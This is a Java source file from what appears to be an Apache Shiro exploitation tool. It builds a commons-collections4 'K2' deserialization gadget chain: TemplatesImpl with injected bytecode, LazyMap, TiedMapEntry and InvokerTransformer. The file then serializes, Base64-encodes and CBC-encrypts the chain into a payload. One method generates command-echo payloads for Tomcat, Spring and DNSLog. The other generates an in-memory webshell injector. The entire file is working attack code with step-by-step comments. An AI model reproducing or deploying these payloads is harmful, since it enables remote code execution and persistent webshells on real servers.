package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.y5neko.shiroexp.payloads.MemshellLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * CommonsCollectionsK2 利用链
 * 使用 commons-collections4 包
 * TiedMapEntry + LazyMap + InvokerTransformer 组合
 */
public class CommonsCollectionsK2 {

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 生成回显payload
     * @param echoType 回显类型
     * @param key 密钥
     * @return 加密后的payload字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 根据回显类型生成恶意类
        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);
        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);
        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);
        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);
        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "a");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // CCK2 利用链核心 (使用 commons-collections4)
        // 1. 创建初始 InvokerTransformer (方法名为 toString，后续会反射修改为 newTransformer)
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // 2. 创建 LazyMap (注意：commons-collections4 使用 LazyMap.lazyMap 静态方法)
        HashMap<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.lazyMap(innerMap, (Transformer) transformer);

        // 3. 创建 TiedMapEntry，绑定 LazyMap 和 TemplatesImpl
        TiedMapEntry tied = new TiedMapEntry((Map) lazyMap, templates);

        // 4. 创建 outer HashMap，将 TiedMapEntry 作为 key 放入
        Map<Object, Object> outerMap = new HashMap<>();
        outerMap.put(tied, "t");

        // 5. 清空 innerMap（关键步骤，确保反序列化时触发）
        innerMap.clear();

        // 6. 反射修改 InvokerTransformer 的方法名为 newTransformer
        setFieldValue(transformer, "iMethodName", "newTransformer");

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(outerMap);
        oos.close();

        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
        return Tools.CBC_Encrypt(key, data);
    }

    /**
     * 生成内存马payload
     * @param key 密钥
     * @return 加密后的payload字符串
     */
    public static String genMemPayload(String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemshellLoader 作为内存马注入器
        MemshellLoader memshellLoader = new MemshellLoader();
        ctClass = memshellLoader.genPayload(pool);

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "a");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // CCK2 利用链核心 (使用 commons-collections4)
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.lazyMap(innerMap, (Transformer) transformer);

        TiedMapEntry tied = new TiedMapEntry((Map) lazyMap, templates);

        Map<Object, Object> outerMap = new HashMap<>();
        outerMap.put(tied, "t");

        innerMap.clear();

        setFieldValue(transformer, "iMethodName", "newTransformer");

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(outerMap);
        oos.close();

        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
        return Tools.CBC_Encrypt(key, data);
    }
}
